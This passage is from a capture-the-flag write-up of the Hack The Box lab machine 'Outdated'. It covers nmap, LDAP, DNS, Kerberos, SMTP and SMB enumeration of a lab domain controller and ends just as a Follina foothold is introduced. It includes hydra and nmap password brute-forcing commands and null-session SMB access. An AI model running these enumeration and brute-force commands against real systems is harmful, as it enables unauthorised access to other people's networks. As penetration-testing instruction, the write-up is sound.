0%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%20Warning:%20OSScan%20results%20may%20be%20unreliable%20because%20we%20could%20not%20find%20at%20least%201%20open%20and%201%20closed%20port%0a%20%20Device%20type:%20general%20purpose%0a%20%20Running%20%28JUST%20GUESSING%29:%20Microsoft%20Windows%202019%20%2889%25%29%0a%20%20Aggressive%20OS%20guesses:%20Microsoft%20Windows%20Server%202019%20%2889%25%29%0a%20%20No%20exact%20OS%20matches%20for%20host%20%28test%20conditions%20non-ideal%29.%0a%20%20Service%20Info:%20Hosts:%20mail.outdated.htb,%20DC;%20OS:%20Windows;%20CPE:%20cpe:/o:microsoft:windows%0a%0a%20%20Host%20script%20results:%0a%20%20%7c%20smb2-time:%0a%20%20%7c%20%20%20date:%202024-10-10T15:53:22%0a%20%20%7c_%20%20start_date:%20N/A%0a%20%20%7c_clock-skew:%20mean:%208h00m00s,%20deviation:%200s,%20median:%208h00m00s%0a%20%20%7c%20smb2-security-mode:%0a%20%20%7c%20%20%203:1:1:%0a%20%20%7c_%20%20%20%20Message%20signing%20enabled%20and%20required%0a%0a%20%20OS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0a%20%20Nmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%20248.40%20seconds">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  kali in 46.02-HTB/BlogEntriesMade/Outdated/scans/nmap  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh  took 11s
</span></span><span style="display:flex;"><span>  🕙 08:49:33 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
</span></span><span style="display:flex;"><span>  Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-10 08:49 BST
</span></span><span style="display:flex;"><span>  Nmap scan report <span style="color:#66d9ef">for</span> 10.129.229.239
</span></span><span style="display:flex;"><span>  Host is up <span style="color:#f92672">(</span>0.040s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>  Not shown: <span style="color:#ae81ff">65514</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>  25/tcp    open  smtp          hMailServer smtpd
</span></span><span style="display:flex;"><span>  | smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
</span></span><span style="display:flex;"><span>  |_ <span style="color:#ae81ff">211</span> DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span><span style="display:flex;"><span>  53/tcp    open  domain        Simple DNS Plus
</span></span><span style="display:flex;"><span>  88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-10-10 15:52:26Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>  139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>  445/tcp   open  microsoft-ds?
</span></span><span style="display:flex;"><span>  464/tcp   open  kpasswd5?
</span></span><span style="display:flex;"><span>  593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>  636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: outdated.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  |_ssl-date: 2024-10-10T15:54:00+00:00; +8h00m01s from scanner time.
</span></span><span style="display:flex;"><span>  | ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC.outdated.htb
</span></span><span style="display:flex;"><span>  | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb
</span></span><span style="display:flex;"><span>  | Not valid before: 2023-12-13T00:17:36
</span></span><span style="display:flex;"><span>  |_Not valid after:  2024-12-12T00:17:36
</span></span><span style="display:flex;"><span>  3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: outdated.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  |_ssl-date: 2024-10-10T15:54:00+00:00; +8h00m01s from scanner time.
</span></span><span style="display:flex;"><span>  | ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC.outdated.htb
</span></span><span style="display:flex;"><span>  | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb
</span></span><span style="display:flex;"><span>  | Not valid before: 2023-12-13T00:17:36
</span></span><span style="display:flex;"><span>  |_Not valid after:  2024-12-12T00:17:36
</span></span><span style="display:flex;"><span>  3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: outdated.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  | ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC.outdated.htb
</span></span><span style="display:flex;"><span>  | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb
</span></span><span style="display:flex;"><span>  | Not valid before: 2023-12-13T00:17:36
</span></span><span style="display:flex;"><span>  |_Not valid after:  2024-12-12T00:17:36
</span></span><span style="display:flex;"><span>  |_ssl-date: 2024-10-10T15:54:00+00:00; +8h00m01s from scanner time.
</span></span><span style="display:flex;"><span>  5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  |_http-title: Not Found
</span></span><span style="display:flex;"><span>  |_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>  8530/tcp  open  http          Microsoft IIS httpd 10.0
</span></span><span style="display:flex;"><span>  |_http-server-header: Microsoft-IIS/10.0
</span></span><span style="display:flex;"><span>  | http-methods:
</span></span><span style="display:flex;"><span>  |_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span>  |_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title.
</span></span><span style="display:flex;"><span>  8531/tcp  open  unknown
</span></span><span style="display:flex;"><span>  9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style="display:flex;"><span>  49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>  49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>  49692/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>  49924/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>  49950/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>  49984/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>  Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
</span></span><span style="display:flex;"><span>  Device type: general purpose
</span></span><span style="display:flex;"><span>  Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>  Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Host script results:
</span></span><span style="display:flex;"><span>  | smb2-time:
</span></span><span style="display:flex;"><span>  |   date: 2024-10-10T15:53:22
</span></span><span style="display:flex;"><span>  |_  start_date: N/A
</span></span><span style="display:flex;"><span>  |_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s
</span></span><span style="display:flex;"><span>  | smb2-security-mode:
</span></span><span style="display:flex;"><span>  |   3:1:1:
</span></span><span style="display:flex;"><span>  |_    Message signing enabled and required
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>  Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 248.40 seconds</span></span></code></pre></div>
    
</div>
</li>
<li>
<p><strong>Findings</strong>:</p>
<ul>
<li>8530 &amp; 8531</li>
<li>We can see that mail.outdated.htb is used:
<ul>
<li><code>Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows</code></li>
<li>I will add that to my <code>/etc/hosts</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="ldap-389">LDAP <code>389</code>:</h3>
<h4 id="using-ldap-anonymous-bind-to-enumerate-further">Using LDAP anonymous bind to enumerate further:</h4>
<ul>
<li>If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
<ul>
<li>We can actually retrieve a significant amount of information via anonymous bind such as:
<ul>
<li>A list of all users</li>
<li>A list of all groups</li>
<li>A list of all computers.</li>
<li>User account attributes.</li>
<li>The domain password policy.</li>
<li>Enumerate users who are susceptible to AS-REPRoasting.</li>
<li>Passwords stored in the description fields</li>
</ul>
</li>
<li>The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here</p>
<ul>
<li><a href="https://github.com/bloodstiller/ldapchecker">https://github.com/bloodstiller/ldapchecker</a></li>
</ul>
</li>
<li>
<p>It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.</p>
<ol>
<li>
<p><!-- raw HTML omitted -->We have the naming context of the domain<!-- raw HTML omitted -->:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="kali%20in%20~/Desktop/WindowsTools%20%f0%9f%90%8d%20v3.12.6%20%202GiB/15GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2008:50:47%20zsh%20%e2%9d%af%20python3%20ldapchecker.py%20$box%0aAttempting%20to%20connect%20to%2010.129.229.239%20with%20SSL...%0aConnected%20successfully.%20Retrieving%20server%20information...%0aDSA%20info%20%28from%20DSE%29:%0a%20%20Supported%20LDAP%20versions:%203,%202%0a%20%20Naming%20contexts:%0a%20%20%20%20DC=outdated,DC=htb%0a%20%20%20%20CN=Configuration,DC=outdated,DC=htb%0a%20%20%20%20CN=Schema,CN=Configuration,DC=outdated,DC=htb%0a%20%20%20%20DC=DomainDnsZones,DC=outdated,DC=htb%0a%20%20%20%20DC=ForestDnsZones,DC=outdated,DC=htb">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in ~/Desktop/WindowsTools 🐍 v3.12.6  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>🕙 08:50:47 zsh ❯ python3 ldapchecker.py $box
</span></span><span style="display:flex;"><span>Attempting to connect to 10.129.229.239 with SSL...
</span></span><span style="display:flex;"><span>Connected successfully. Retrieving server information...
</span></span><span style="display:flex;"><span>DSA info <span style="color:#f92672">(</span>from DSE<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>  Supported LDAP versions: 3, <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>  Naming contexts:
</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>outdated,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>outdated,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>outdated,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>outdated,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>outdated,DC<span style="color:#f92672">=</span>htb</span></span></code></pre></div>
    
</div>
</li>
<li>
<p><!-- raw HTML omitted -->We have the domain functionaility level<!-- raw HTML omitted -->:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Other:
</span></span><span style="display:flex;"><span>  domainFunctionality:
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>  forestFunctionality:
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>  domainControllerFunctionality:
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>  rootDomainNamingContext:
</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>outdated,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>  ldapServiceName:
</span></span><span style="display:flex;"><span>    outdated.htb:dc$@OUTDATED.HTB</span></span></code></pre></div>
    
</div>
<ul>
<li>The functionality level determines the minimum version of Windows server that can be used for a DC.
<ul>
<li>
<p>+Note+: that any host os can be used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels</a></p>
</li>
<li>
<p>Knowing the function level is useful as if want to target the DC&rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.</p>
</li>
<li>
<p>In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.</p>
</li>
<li>
<p>Here’s a list of functional level numbers and their corresponding Windows Server operating systems:</p>
<table>
  <thead>
      <tr>
          <th>Functional Level Number</th>
          <th>Corresponding OS</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>0</td>
          <td>Windows 2000</td>
      </tr>
      <tr>
          <td>1</td>
          <td>Windows Server 2003 Interim</td>
      </tr>
      <tr>
          <td>2</td>
          <td>Windows Server 2003</td>
      </tr>
      <tr>
          <td>3</td>
          <td>Windows Server 2008</td>
      </tr>
      <tr>
          <td>4</td>
          <td>Windows Server 2008 R2</td>
      </tr>
      <tr>
          <td>5</td>
          <td>Windows Server 2012</td>
      </tr>
      <tr>
          <td>6</td>
          <td>Windows Server 2012 R2</td>
      </tr>
      <tr>
          <td>7</td>
          <td>Windows Server 2016</td>
      </tr>
      <tr>
          <td>8</td>
          <td>Windows Server 2019</td>
      </tr>
      <tr>
          <td>9</td>
          <td>Windows Server 2022</td>
      </tr>
  </tbody>
</table>
<ul>
<li>+Note+:
<ul>
<li>Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.</li>
<li>As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><!-- raw HTML omitted -->We have the full server name<!-- raw HTML omitted -->:</p>
<ul>
<li>Again we can see this has the CN as the base (mentioned previously.)







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>serverName:
</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>DC,CN<span style="color:#f92672">=</span>Servers,CN<span style="color:#f92672">=</span>Default-First-Site-Name,CN<span style="color:#f92672">=</span>Sites,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>outdated,DC<span style="color:#f92672">=</span>htb</span></span></code></pre></div>
    
</div>
</li>
</ul>
</li>
</ol>
</li>
<li>
<p>It&rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.</p>
<ul>
<li>We have the naming context.</li>
<li>Domain name.</li>
</ul>
</li>
<li>
<p><strong>I update my <code>/etc/hosts</code> file now that we have the server name</strong>.</p>
<ul>
<li>This is so we can use tools like <a href="https://github.com/ropnop/kerbrute">kerbrute</a> for user enumeration as well as other tools later on.</li>
</ul>
</li>
</ul>
<h3 id="dns-53">DNS <code>53</code>:</h3>
<ul>
<li><strong>Using dnsenum to enumerate DNS entries</strong>:
<ul>
<li><code>dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain</code></li>
<li><figure><img src="/ox-hugo/2024-10-10-091244_.png">
</figure>
</li>
<li>As we can see there are some interesting entries here:
<ul>
<li><code>mail.outdated.htb</code> (which was in our NMAP scan)</li>
<li><code>client.outdated.htb</code></li>
<li><code>wsus.outdated.htb</code></li>
</ul>
</li>
<li>I add all of these to my <code>/etc/hosts</code></li>
</ul>
</li>
</ul>
<h3 id="kerberos-88">Kerberos <code>88</code>:</h3>
<h4 id="using-kerbrute-to-bruteforce-usernames">Using <a href="https://github.com/ropnop/kerbrute">Kerbrute</a> to bruteforce Usernames:</h4>
<ul>
<li><strong>As kerberos is present we can enumerate users using</strong> <a href="https://github.com/ropnop/kerbrute">kerbrute</a>:
<ul>
<li><code>kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt</code>
<ul>
<li><figure><img src="/ox-hugo/2024-10-10-090552_.png">
</figure>
</li>
</ul>
</li>
<li>I get 1 valid username I add this to my list of users:
<ul>
<li><code>sflowers@outdated.htb</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="smtp-25">SMTP <code>25</code>:</h3>
<h4 id="connecting-to-the-smtp-service-using-telnet">Connecting to the SMTP service using <code>telnet</code>:</h4>
<ul>
<li><code>telnet mail.outdated.htb 25</code></li>
<li>I run <code>EHLO all</code> &amp; <code>help</code> to enumerate the service:</li>
<li><figure><img src="/ox-hugo/2024-10-10-094237_.png">
</figure>
</li>
<li>As we can see we do have the option <code>AUTH LOGIN</code>, so this may be useful for later if we need to send anything.</li>
<li>+Note+: Remember you can only send mail via <code>SMTP</code> on the CLI not read. We need <code>IMAP</code> or <code>POP3</code> to read.</li>
</ul>
<h4 id="smtp-commands--via-telnet">SMTP Commands (via Telnet):</h4>
<ul>
<li><code>HELO / EHLO</code>: Identifies your client to the server (use <code>EHLO</code> for extended features).</li>
<li><code>MAIL</code>: Specifies the sender&rsquo;s email address.</li>
<li><code>RCPT</code>: Specifies the recipient&rsquo;s email address.</li>
<li><code>DATA</code>: Starts the email body input.</li>
<li><code>QUIT</code>: Ends the session.</li>
<li><code>NOOP</code>: No operation (used to keep the connection alive).</li>
<li><code>VRFY</code>: Verifies if a mailbox exists (not always allowed for privacy reasons).</li>
<li><code>RSET</code>: Resets the current session without quitting.</li>
</ul>
<h4 id="i-do-some-user-enumeration-using-smtp-user-enum">I do some user enumeration using <a href="https://www.kali.org/tools/smtp-user-enum/">smtp-user-enum</a>:</h4>
<ul>
<li>
<p><strong>First with the</strong> <code>VRFY Method</code>:</p>
<ul>
<li><code>smtp-user-enum -M VRFY -U ~/Wordlists/seclists/Usernames/Names/names.txt -D mail.$domain -t $box</code>
<ul>
<li><figure><img src="/ox-hugo/2024-10-10-094452_.png">
</figure>
</li>
<li>No hits using the <code>VRFY</code> method.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>I try again using the</strong> <code>EXPN</code> <strong>method but nothing either</strong>:</p>
<ul>
<li><code>smtp-user-enum -M EXPN -U ~/Wordlists/seclists/Usernames/Names/names.txt -D mail.$domain -t $box</code>
<ul>
<li><figure><img src="/ox-hugo/2024-10-10-103402_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="attempting-to-bruteforce-smtp">Attempting to bruteforce SMTP:</h4>
<h5 id="using-hydra-to-bruteforce-smtp">Using Hydra to bruteforce SMTP:</h5>
<ul>
<li><code>hydra -l itsupport -P +/Wordlists/rockyou.txt $box smtp -t 1</code></li>
<li>I try hydra however no matter how many threads I set it always disables due to too many connections.
<ul>
<li><figure><img src="/ox-hugo/2024-10-10-135511_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h5 id="i-try-the-smtp-nmap-bruteforcing-dot-nse-script">I try the SMTP NMAP bruteforcing <code>.nse</code> script:</h5>
<ul>
<li><code>nmap -p 25 --script smtp-brute $box</code></li>
<li><figure><img src="/ox-hugo/2024-10-10-135635_.png">
</figure>
</li>
</ul>
<h3 id="smb-445">SMB <code>445</code>:</h3>
<h4 id="attempting-to-connect-with-null-and-guest-sessions">Attempting to connect with NULL &amp; Guest sessions:</h4>
<ul>
<li><code>netexec smb $box -u 'guest' -p '' --shares</code></li>
<li><figure><img src="/ox-hugo/2024-10-10-090820_.png">
</figure>
</li>
<li><code>netexec smb $box -u '' -p '' --shares</code></li>
<li><figure><img src="/ox-hugo/2024-10-10-090900_.png">
</figure>

<ul>
<li>So I can see we have access to the <code>Shares</code> share as well as <code>$IPC</code></li>
<li>We can also see that there are multiple mentions of <code>wsus</code> as seen in our <code>DNSenum</code> findings.</li>
</ul>
</li>
</ul>
<h4 id="attempting-to-use-the-sflowers-username-as-password">Attempting to use the <code>sflowers</code> username as password:</h4>
<ul>
<li><strong>I try and connect with the</strong> <code>sflowers</code> *user and use their username as password as well as a blank password but no luck:
<ul>
<li><figure><img src="/ox-hugo/2024-10-10-091120_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="logging-into-the-shares-to-find-a-pdf">Logging into the <code>Shares</code> to find a <code>PDF</code>:</h3>
<ul>
<li>
<p><strong>I login to the SMB share using the guest account &amp; immediatley find a</strong> <code>pdf</code>:</p>
<ul>
<li><code>smbclient -U $domain\$guest \\\\$box\\Shares</code></li>
<li><figure><img src="/ox-hugo/2024-10-10-091446_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I download the</strong> <code>pdf</code>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-10-091600_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="attempting-to-extract-creator-names-from-the-dot-pdf">Attempting to extract creator names from the <code>.PDF</code>:</h3>
<p>If you are not aware, it is sometimes possible to extract valid domain usernames from <code>pdf's</code> if they have been created on a Windows host. As often the Creator Field is populated using the Windows User&rsquo;s Logged-In Name</p>
<ul>
<li><strong>Some reasons why the Creator Field Uses the Windows User&rsquo;s Logged-In Name</strong>:
<ul>
<li>
<p><strong>PDF Metadata Collection</strong>:</p>
<ul>
<li>When creating a PDF, many programs (e.g., Microsoft Word, Adobe Acrobat) automatically pull metadata from the system.</li>
</ul>
</li>
<li>
<p><strong>System Environment Variables</strong>:</p>
<ul>
<li>The logged-in Windows username is part of system environment variables. This is often used to populate fields like &ldquo;<code>Creator</code>&rdquo; in the PDF document.</li>
</ul>
</li>
<li>
<p><strong>Program Defaults</strong>:</p>
<ul>
<li>By default, many PDF generation tools use the logged-in username as the creator unless manually changed by the user.</li>
</ul>
</li>
<li>
<p><strong>Tracking Ownership</strong>:</p>
<ul>
<li>This feature helps track the original creator or author of a document for auditing or document management purposes.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="attempting-to-extract-usernames-from-the-pdf-using-exiftool">Attempting to extract Usernames From the PDF using exiftool:</h5>
<ul>
<li><code>exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq &gt; userNames.txt</code></li>
<li>I run it and check the output of the file, however there are no valid usernames, just that it was created using Word:</li>
<li><figure><img src="/ox-hugo/2024-10-10-091801_.png">
</figure>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Command Breakdown:</p>
<ol>
<li>
<p><code>exiftool -Creator -csv *pdf</code></p>
<ul>
<li><code>exiftool</code>: Run the tool</li>
<li><code>-Creator</code>: Extracts the <code>Creator</code> metadata field from the files.</li>
<li><code>-csv</code>: Outputs the data in CSV format.
<ul>
<li>This is the most important part for the rest of the command to work:
<ul>
<li>The <code>CSV</code> format provides a structured way to output the metadata in rows and columns. When extracting metadata from multiple PDFs, each PDF&rsquo;s metadata is presented as a row, and each field (like &ldquo;<code>Creator</code>&rdquo;) is a column. This makes it easier to process the data programmatically.</li>
<li><strong>Simplicity</strong>: When using tools like <code>cut</code>, it’s easier to extract specific fields by referring to column numbers (e.g., <code>-f2</code> for the second column), which is straightforward with <code>CSV</code> formatting.</li>
</ul>
</li>
</ul>
</li>
<li><code>*pdf</code>: Targets all PDF files in the current directory.</li>
</ul>
</li>
<li>
<p><code>| cut -d, -f2</code></p>
<ul>
<li><code>|</code>: Pipes the output from the previous command into the next.</li>
<li><code>cut</code>: Extracts specific fields from the CSV output.</li>
<li><code>-d,</code>: Uses a comma as the delimiter (since it&rsquo;s CSV data).</li>
<li><code>-f2</code>: Selects the second field, which contains the creator name.</li>
</ul>
</li>
<li>
<p><code>| sort</code>: Sorts the creator names alphabetically.</p>
</li>
<li>
<p><code>| uniq</code>: Removes duplicate names, leaving only unique entries.</p>
</li>
<li>
<p><code>&gt; userNames.txt</code></p>
<ul>
<li>Redirects the final output (unique creator names) into a file named <code>userNames.txt</code></li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="reading-noc-reminder-dot-pdf-and-discovering-exploits-that-the-environment-is-susceptible-to">Reading <code>NOC_Reminder.pdf</code> and discovering exploits that the environment is susceptible to:</h3>
<ul>
<li>Looking at the PDF it provides a list of vulnerabilities in the environment that they need to patch as well as corresponding CVE&rsquo;s.
<ul>
<li><figure><img src="/ox-hugo/2024-10-10-092144_.png">
</figure>
</li>
<li>It also reveals another email address: <code>itsupport@outdated.htb</code> is expecting to be sent links to internal web applications to them.</li>
<li><figure><img src="/ox-hugo/2024-10-10-143233_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="investigating-the-cve-list-for-an-attack-path">Investigating the CVE list For an attack path:</h3>
<ul>
<li><strong>I will use these CVE&rsquo;s as a starting point to see if we can find an easy way in.</strong></li>
</ul>
<h5 id="cve-2022-30138-printspooler-privilege-escalation">CVE-2022-30138 PrintSpooler Privilege Escalation:</h5>
<ul>
<li>Good privesc path once we have access as this needs to be performed locally.</li>
</ul>
<h5 id="cve-2022-30129-remote-code-execution-vulnerability-in-visual-studio-code">CVE-2022-30129 Remote Code Execution vulnerability in Visual Studio Code:</h5>
<ul>
<li>This CVE-2022-30129 pertains to a Remote Code Execution vulnerability in Visual Studio Code, affecting versions less than 1.67.1.</li>
</ul>
<h5 id="cve-2022-29110-microsoft-excel-remote-code-execution-vulnerability">CVE-2022-29110 Microsoft Excel Remote Code Execution Vulnerability:</h5>
<ul>
<li>Microsoft CVE-2022-29110: Microsoft Excel Remote Code Execution Vulnerability</li>
</ul>
<h5 id="cve-2022-29130-windows-lightweight-directory-access-protocol--ldap--remote-code-execution-vulnerability-dot">CVE-2022-29130 Windows Lightweight Directory Access Protocol (LDAP) Remote Code Execution Vulnerability.:</h5>
<ul>
<li>Microsoft Windows: CVE-2022-29130: Windows Lightweight Directory Access Protocol (LDAP) Remote Code Execution Vulnerability.</li>
</ul>
<h5 id="cve-2022-30190-follina-exploit">CVE-2022-30190 Follina Exploit:</h5>
<ul>
<li>This is the follina exploit, it is a microsoft word exploit.
<ul>
<li>There is a great writeup here by HTB.
<ul>
<li><a href="https://www.hackthebox.com/blog/cve-2022-30190-follina-explained">https://www.hackthebox.com/blog/cve-2022-30190-follina-explained</a></li>
</ul>
</li>
<li>John Hammond also has a great video here {{&lt; youtube dGCOhORNKRk &gt;}}</li>
</ul>
</li>
</ul>
<h2 id="2-dot-foothold">2. Foothold:</h2>
<h3 id="quick-overview-on-follina-exploit">Quick overview on Follina Exploit:</h3>
<ul>
<li>We craft a malicious Office documents that uses a feature to load remote <code>HTML</code> via a link. This triggers <code>Microsoft Support Diagnostic Tool MSDT</code> (overview below), allowing us to execute arbitrary code on the victim&rsquo;s machine without the need for macros.</li>
<li>+This is the crazy part+
<ul>
<li>All that needs to happen for exploitation is that the user opens or +previews+ (if <code>.rtf</code> is used) the office document.</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li><strong>Attack Path</strong>
<ul>
